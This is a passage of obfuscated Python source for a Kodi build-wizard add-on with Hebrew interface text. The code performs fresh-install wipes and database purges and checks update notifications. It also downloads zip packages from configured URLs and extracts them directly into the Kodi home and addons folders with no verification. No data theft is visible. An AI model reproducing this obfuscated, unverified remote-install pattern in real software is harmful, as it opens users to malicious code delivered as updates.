				elif OOO0O000OOO0OOOOO =='advancedsettings.xml'and OOOO00O0O0OOOO0OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4685
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4686
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'program.apollo'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4687
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4688
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.elementum'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4691
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4692
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4693
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.quasar'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4695
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'program.apollo'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4696
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4697
				elif OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -2 ]=='userdata'and OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOO00O0O0OOOO0OO [OO00OOOOO0O0OOO0O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4698
				elif OOO0O000OOO0OOOOO in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0O000OOO0OOOOO ,xbmc .LOGNOTICE )#line:4699
				elif OOO0O000OOO0OOOOO .endswith ('.db'):#line:4700
					try :#line:4701
						if OOO0O000OOO0OOOOO ==OOO0OO00OOO0OO000 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0O000OOO0OOOOO ,KODIV ),xbmc .LOGNOTICE )#line:4702
						else :os .remove (os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ))#line:4703
					except Exception as O00OOOOO0O0O00000 :#line:4704
						if not OOO0O000OOO0OOOOO .startswith ('Textures13'):#line:4705
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4706
							wiz .log ("-> %s"%(str (O00OOOOO0O0O00000 )),xbmc .LOGNOTICE )#line:4707
							wiz .purgeDb (os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ))#line:4708
				else :#line:4709
					DP .update (int (wiz .percentage (OOO00OO000OOOOOOO ,O000O00O00O0O0OOO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O000OOO0OOOOO ),'')#line:4710
					try :os .remove (os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ))#line:4711
					except Exception as O00OOOOO0O0O00000 :#line:4712
						wiz .log ("Error removing %s"%os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),xbmc .LOGNOTICE )#line:4713
						wiz .log ("-> / %s"%(str (O00OOOOO0O0O00000 )),xbmc .LOGNOTICE )#line:4714
			if DP .iscanceled ():#line:4715
				DP .close ()#line:4716
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4717
				return False #line:4718
		for OOO0OOOO000OO0O0O ,O0O0O0OO0OOOO00O0 ,O0OOOO0O0O00OO0O0 in os .walk (O0OOO0000OOOOOO0O ,topdown =True ):#line:4719
			O0O0O0OO0OOOO00O0 [:]=[O0O00O0000OOO0O00 for O0O00O0000OOO0O00 in O0O0O0OO0OOOO00O0 if O0O00O0000OOO0O00 not in EXCLUDES ]#line:4720
			for OOO0O000OOO0OOOOO in O0O0O0OO0OOOO00O0 :#line:4721
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O000OOO0OOOOO ),'')#line:4722
			  if OOO0O000OOO0OOOOO not in ["Database","userdata","temp","addons","addon_data"]:#line:4723
			   if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4724
			    if not (OOO0O000OOO0OOOOO =='skin.titan'and KEEPSKIN3 =='true'):#line:4726
			      if not (OOO0O000OOO0OOOOO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4727
			       if not (OOO0O000OOO0OOOOO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4728
			        if not (OOO0O000OOO0OOOOO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4729
			         if not (OOO0O000OOO0OOOOO =='program.apollo'and KEEPINFO =='true'):#line:4730
			          if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4731
			            if not (OOO0O000OOO0OOOOO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4733
			             if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4734
			              if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4735
			               if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4736
			                if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4737
			                 if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4738
			                  if not (OOO0O000OOO0OOOOO =='plugin.video.neptune'and KEEPINFO =='true'):#line:4739
			                   if not (OOO0O000OOO0OOOOO =='plugin.video.youtube'and KEEPINFO =='true'):#line:4740
			                    if not (OOO0O000OOO0OOOOO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4741
			                     if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4742
			                       if not (OOO0O000OOO0OOOOO =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4744
			                           if not (OOO0O000OOO0OOOOO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4748
			                            if not (OOO0O000OOO0OOOOO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4749
			                             if not (OOO0O000OOO0OOOOO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4750
			                              if not (OOO0O000OOO0OOOOO =='plugin.video.quasar'and KEEPINFO =='true'):#line:4751
			                               if not (OOO0O000OOO0OOOOO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4752
			                                  shutil .rmtree (os .path .join (OOO0OOOO000OO0O0O ,OOO0O000OOO0OOOOO ),ignore_errors =True ,onerror =None )#line:4754
			if DP .iscanceled ():#line:4755
				DP .close ()#line:4756
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4757
				return False #line:4758
		DP .close ()#line:4759
		wiz .clearS ('build')#line:4760
		if over ==True :#line:4761
			return True #line:4762
		elif install =='restore':#line:4763
			return True #line:4764
		elif install :#line:4765
			buildWizard (install ,'normal',over =True )#line:4766
		else :#line:4767
			if INSTALLMETHOD ==1 :OOOOO000OOO0000OO =1 #line:4768
			elif INSTALLMETHOD ==2 :OOOOO000OOO0000OO =0 #line:4769
			else :OOOOO000OOO0000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4770
			if OOOOO000OOO0000OO ==1 :wiz .reloadFix ('fresh')#line:4771
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4772
	else :#line:4773
		if not install =='restore':#line:4774
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4775
			wiz .refresh ()#line:4776
def clearCache ():#line:4781
		wiz .clearCache ()#line:4782
def fixwizard ():#line:4786
		wiz .fixwizard ()#line:4787
def totalClean ():#line:4789
		wiz .clearCache ()#line:4791
		wiz .clearPackages ('total')#line:4792
		clearThumb ('total')#line:4793
		cleanfornewbuild ()#line:4794
def cleanfornewbuild ():#line:4795
		try :#line:4796
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4797
		except :#line:4798
			pass #line:4799
		try :#line:4800
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4801
		except :#line:4802
			pass #line:4803
		try :#line:4804
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4805
		except :#line:4806
			pass #line:4807
def clearThumb (type =None ):#line:4808
	O00000O0O00OOO0OO =wiz .latestDB ('Textures')#line:4809
	if not type ==None :OO000O0OO0O0OO000 =1 #line:4810
	else :OO000O0OO0O0OO000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O00000O0O00OOO0OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4811
	if OO000O0OO0O0OO000 ==1 :#line:4812
		try :wiz .removeFile (os .join (DATABASE ,O00000O0O00OOO0OO ))#line:4813
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O00000O0O00OOO0OO )#line:4814
		wiz .removeFolder (THUMBS )#line:4815
	else :wiz .log ('Clear thumbnames cancelled')#line:4817
	wiz .redoThumbs ()#line:4818
def purgeDb ():#line:4820
	O000OO0OOOOO0O0OO =[];OO0OO0000O0000OO0 =[]#line:4821
	for OO0O0O0OOOO00O000 ,OOOOO00OO0OO0OO00 ,O00OOOOO000OOO000 in os .walk (HOME ):#line:4822
		for O00OO0O00000O0OO0 in fnmatch .filter (O00OOOOO000OOO000 ,'*.db'):#line:4823
			if O00OO0O00000O0OO0 !='Thumbs.db':#line:4824
				O0OOO00O00OOOOO0O =os .path .join (OO0O0O0OOOO00O000 ,O00OO0O00000O0OO0 )#line:4825
				O000OO0OOOOO0O0OO .append (O0OOO00O00OOOOO0O )#line:4826
				O0O0O00OOOOOO00OO =O0OOO00O00OOOOO0O .replace ('\\','/').split ('/')#line:4827
				OO0OO0000O0000OO0 .append ('(%s) %s'%(O0O0O00OOOOOO00OO [len (O0O0O00OOOOOO00OO )-2 ],O0O0O00OOOOOO00OO [len (O0O0O00OOOOOO00OO )-1 ]))#line:4828
	if KODIV >=16 :#line:4829
		O0O00OOOO0000O000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OO0000O0000OO0 )#line:4830
		if O0O00OOOO0000O000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4831
		elif len (O0O00OOOO0000O000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4832
		else :#line:4833
			for O0OOO000O00O0OOOO in O0O00OOOO0000O000 :wiz .purgeDb (O000OO0OOOOO0O0OO [O0OOO000O00O0OOOO ])#line:4834
	else :#line:4835
		O0O00OOOO0000O000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OO0000O0000OO0 )#line:4836
		if O0O00OOOO0000O000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4837
		else :wiz .purgeDb (O000OO0OOOOO0O0OO [O0OOO000O00O0OOOO ])#line:4838
def fastupdatefirstbuild (OO0000OOO0OO000OO ):#line:4844
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4845
	if ENABLE =='Yes':#line:4846
		if not NOTIFY =='true':#line:4847
			OO00OO0OO0O0O0000 =wiz .workingURL (NOTIFICATION )#line:4848
			if OO00OO0OO0O0O0000 ==True :#line:4849
				O00O000OOO00OO00O ,OOOO00O00OOOO0OO0 =wiz .splitNotify (NOTIFICATION )#line:4850
				if not O00O000OOO00OO00O ==False :#line:4852
					try :#line:4853
						O00O000OOO00OO00O =int (O00O000OOO00OO00O );OO0000OOO0OO000OO =int (OO0000OOO0OO000OO )#line:4854
						checkidupdate ()#line:4855
						wiz .setS ("notedismiss","true")#line:4856
						if O00O000OOO00OO00O ==OO0000OOO0OO000OO :#line:4857
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O00O000OOO00OO00O ),xbmc .LOGNOTICE )#line:4858
						elif O00O000OOO00OO00O >OO0000OOO0OO000OO :#line:4860
							wiz .log ("[Notifications] id: %s"%str (O00O000OOO00OO00O ),xbmc .LOGNOTICE )#line:4861
							wiz .setS ('noteid',str (O00O000OOO00OO00O ))#line:4862
							wiz .setS ("notedismiss","true")#line:4863
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4866
					except Exception as OOO000O0OO0OOOOO0 :#line:4867
						wiz .log ("Error on Notifications Window: %s"%str (OOO000O0OO0OOOOO0 ),xbmc .LOGERROR )#line:4868
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4870
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO00OO0OO0O0O0000 ),xbmc .LOGNOTICE )#line:4871
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4872
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4873
def checkidupdate ():#line:4879
				wiz .setS ("notedismiss","true")#line:4881
				OO0O0O0O000OOOOOO =wiz .workingURL (NOTIFICATION )#line:4882
				OOO000OOOOO000000 =" Kodi Premium"#line:4884
				O000O0OOOO0O00O0O =wiz .checkBuild (OOO000OOOOO000000 ,'gui')#line:4885
				OO0OOO0OO0OO0O00O =OOO000OOOOO000000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4886
				if not wiz .workingURL (O000O0OOOO0O00O0O )==True :return #line:4887
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4888
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO000OOOOO000000 ),'','אנא המתן')#line:4889
				O0O0OOO0OOOOOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0OO0OO0O00O )#line:4890
				try :os .remove (O0O0OOO0OOOOOO0OO )#line:4891
				except :pass #line:4892
				logging .warning (O000O0OOOO0O00O0O )#line:4893
				if 'google'in O000O0OOOO0O00O0O :#line:4894
				   OOO0O00OOO0O000O0 =googledrive_download (O000O0OOOO0O00O0O ,O0O0OOO0OOOOOO0OO ,DP ,wiz .checkBuild (OOO000OOOOO000000 ,'filesize'))#line:4895
				else :#line:4898
				  downloader .download (O000O0OOOO0O00O0O ,O0O0OOO0OOOOOO0OO ,DP )#line:4899
				xbmc .sleep (100 )#line:4900
				O00OOO0OO000000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000OOOOO000000 )#line:4901
				DP .update (0 ,O00OOO0OO000000O0 ,'','אנא המתן')#line:4902
				extract .all (O0O0OOO0OOOOOO0OO ,HOME ,DP ,title =O00OOO0OO000000O0 )#line:4903
				DP .close ()#line:4904
				wiz .defaultSkin ()#line:4905
				wiz .lookandFeelData ('save')#line:4906
				if KODIV >=18 :#line:4907
					skindialogsettind18 ()#line:4908
				if INSTALLMETHOD ==1 :O0OOOOOOO00000OO0 =1 #line:4911
				elif INSTALLMETHOD ==2 :O0OOOOOOO00000OO0 =0 #line:4912
				else :DP .close ()#line:4913
def gaiaserenaddon ():#line:4915
  OO0OO00OO0OOOOOOO =(ADDON .getSetting ("gaiaseren"))#line:4916
  OOO000OOO0OOO000O =(ADDON .getSetting ("rdbuild"))#line:4917
  if OO0OO00OO0OOOOOOO =='true'and OOO000OOO0OOO000O =='true':#line:4918
    OO0OOO00OOOOO0O0O =(NEWFASTUPDATE )#line:4919
    OO00OOOO0O00000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4920
    OOOO000O0O000OO0O =xbmcgui .DialogProgress ()#line:4921
    OOOO000O0O000OO0O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4922
    O0O00OOO000OO0O0O =os .path .join (PACKAGES ,'isr.zip')#line:4923
    OOO000OOO00000000 =urllib2 .Request (OO0OOO00OOOOO0O0O )#line:4924
    OOOOOOO0OO0O00O00 =urllib2 .urlopen (OOO000OOO00000000 )#line:4925
    O000O00O0O0000000 =xbmcgui .DialogProgress ()#line:4927
    O000O00O0O0000000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4928
    O000O00O0O0000000 .update (0 )#line:4929
    O00O00OOO0O00OOO0 =open (O0O00OOO000OO0O0O ,'wb')#line:4931
    try :#line:4933
      OO000OO000000000O =OOOOOOO0OO0O00O00 .info ().getheader ('Content-Length').strip ()#line:4934
      O00000000O00O00O0 =True #line:4935
    except AttributeError :#line:4936
          O00000000O00O00O0 =False #line:4937
    if O00000000O00O00O0 :#line:4939
          OO000OO000000000O =int (OO000OO000000000O )#line:4940
    OO0000OO00OO0O000 =0 #line:4942
    O0O0O0OO0OO000O0O =time .time ()#line:4943
    while True :#line:4944
          OOO0000OO00O0OOO0 =OOOOOOO0OO0O00O00 .read (8192 )#line:4945
          if not OOO0000OO00O0OOO0 :#line:4946
              sys .stdout .write ('\n')#line:4947
              break #line:4948
          OO0000OO00OO0O000 +=len (OOO0000OO00O0OOO0 )#line:4950
          O00O00OOO0O00OOO0 .write (OOO0000OO00O0OOO0 )#line:4951
          if not O00000000O00O00O0 :#line:4953
              OO000OO000000000O =OO0000OO00OO0O000 #line:4954
          if O000O00O0O0000000 .iscanceled ():#line:4955
             O000O00O0O0000000 .close ()#line:4956
             try :#line:4957
              os .remove (O0O00OOO000OO0O0O )#line:4958
             except :#line:4959
              pass #line:4960
             break #line:4961
          O0OO00O00O0OO0OOO =float (OO0000OO00OO0O000 )/OO000OO000000000O #line:4962
          O0OO00O00O0OO0OOO =round (O0OO00O00O0OO0OOO *100 ,2 )#line:4963
          OO00O000O0000O00O =OO0000OO00OO0O000 /(1024 *1024 )#line:4964
          O0O0O00O0OO00OOOO =OO000OO000000000O /(1024 *1024 )#line:4965
          O00OOOO000O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O000O0000O00O ,'teal',O0O0O00O0OO00OOOO )#line:4966
          if (time .time ()-O0O0O0OO0OO000O0O )>0 :#line:4967
            O0O00O0OOOO0O0000 =OO0000OO00OO0O000 /(time .time ()-O0O0O0OO0OO000O0O )#line:4968
            O0O00O0OOOO0O0000 =O0O00O0OOOO0O0000 /1024 #line:4969
          else :#line:4970
           O0O00O0OOOO0O0000 =0 #line:4971
          O00O0OO00O0OO00O0 ='KB'#line:4972
          if O0O00O0OOOO0O0000 >=1024 :#line:4973
             O0O00O0OOOO0O0000 =O0O00O0OOOO0O0000 /1024 #line:4974
             O00O0OO00O0OO00O0 ='MB'#line:4975
          if O0O00O0OOOO0O0000 >0 and not O0OO00O00O0OO0OOO ==100 :#line:4976
              O0O0O0O0O00OOOOO0 =(OO000OO000000000O -OO0000OO00OO0O000 )/O0O00O0OOOO0O0000 #line:4977
          else :#line:4978
              O0O0O0O0O00OOOOO0 =0 #line:4979
          O00O0O00O0O00OO0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O00O0OOOO0O0000 ,O00O0OO00O0OO00O0 )#line:4980
          O000O00O0O0000000 .update (int (O0OO00O00O0OO0OOO ),O00OOOO000O000OOO ,O00O0O00O0O00OO0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4982
    O0000000OOOO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4985
    O00O00OOO0O00OOO0 .close ()#line:4988
    extract .all (O0O00OOO000OO0O0O ,O0000000OOOO0O0OO ,O000O00O0O0000000 )#line:4989
    try :#line:4993
      os .remove (O0O00OOO000OO0O0O )#line:4994
    except :#line:4995
      pass #line:4996
def testnotify ():#line:4998
	O00OOOOO00OOO0000 =wiz .workingURL (NOTIFICATION )#line:4999
	if O00OOOOO00OOO0000 ==True :#line:5000
		try :#line:5001
			OO00O00OOOO000000 ,OOOOOOOOO00O0OO0O =wiz .splitNotify (NOTIFICATION )#line:5002
			if OO00O00OOOO000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5003
			if STARTP2 ()=='ok':#line:5004
				notify .notification (OOOOOOOOO00O0OO0O ,True )#line:5005
		except Exception as O0O0OOO0O00O0O00O :#line:5006
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OOO0O00O0O00O ),xbmc .LOGERROR )#line:5007
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5008
def testnotify2 ():#line:5009
	O0OO0O0000OO0OO0O =wiz .workingURL (NOTIFICATION2 )#line:5010
	if O0OO0O0000OO0OO0O ==True :#line:5011
		try :#line:5012
			O00OO00OO0O0000O0 ,O00OOOO000OO0000O =wiz .splitNotify (NOTIFICATION2 )#line:5013
			if O00OO00OO0O0000O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5014
			if STARTP2 ()=='ok':#line:5015
				notify .notification2 (O00OOOO000OO0000O ,True )#line:5016
		except Exception as O00O0O0O0OO000OO0 :#line:5017
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O0O0OO000OO0 ),xbmc .LOGERROR )#line:5018
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5019
def testnotify3 ():#line:5020
	OO00000O00OO000OO =wiz .workingURL (NOTIFICATION3 )#line:5021
	if OO00000O00OO000OO ==True :#line:5022
		try :#line:5023
			O00O00000O0000OOO ,OOO000O0O0OO0OO0O =wiz .splitNotify (NOTIFICATION3 )#line:5024
			if O00O00000O0000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5025
			if STARTP2 ()=='ok':#line:5026
				notify .notification3 (OOO000O0O0OO0OO0O ,True )#line:5027
		except Exception as O00O00O00O0OO0OOO :#line:5028
			wiz .log ("Error on Notifications Window: %s"%str (O00O00O00O0OO0OOO ),xbmc .LOGERROR )#line:5029
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5030
def servicemanual ():#line:5031
	OO000O0O0OO000000 =wiz .workingURL (HELPINFO )#line:5032
	if OO000O0O0OO000000 ==True :#line:5033
		try :#line:5034
			OO0O00O0O0O0O0O00 ,OOOO00OOOO0O000OO =wiz .splitNotify (HELPINFO )#line:5035
			if OO0O00O0O0O0O0O00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5036
			notify .helpinfo (OOOO00OOOO0O000OO ,True )#line:5037
		except Exception as OO0O0O00O0OO00O0O :#line:5038
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0O00O0OO00O0O ),xbmc .LOGERROR )#line:5039
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5040
def testupdate ():#line:5042
	if BUILDNAME =="":#line:5043
		notify .updateWindow ()#line:5044
	else :#line:5045
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5046
def testfirst ():#line:5048
	notify .firstRun ()#line:5049
def testfirstRun ():#line:5051
	notify .firstRunSettings ()#line:5052
def fastinstall ():#line:5055
	notify .firstRuninstall ()#line:5056
def addDir (O00OO0O0OOO00O000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5063
	OOOO0OO00OOO0OO00 =sys .argv [0 ]#line:5064
	if not mode ==None :OOOO0OO00OOO0OO00 +="?mode=%s"%urllib .quote_plus (mode )#line:5065
	if not name ==None :OOOO0OO00OOO0OO00 +="&name="+urllib .quote_plus (name )#line:5066
	if not url ==None :OOOO0OO00OOO0OO00 +="&url="+urllib .quote_plus (url )#line:5067
	O000O00OOOOOOO0OO =True #line:5068
	if themeit :O00OO0O0OOO00O000 =themeit %O00OO0O0OOO00O000 #line:5069
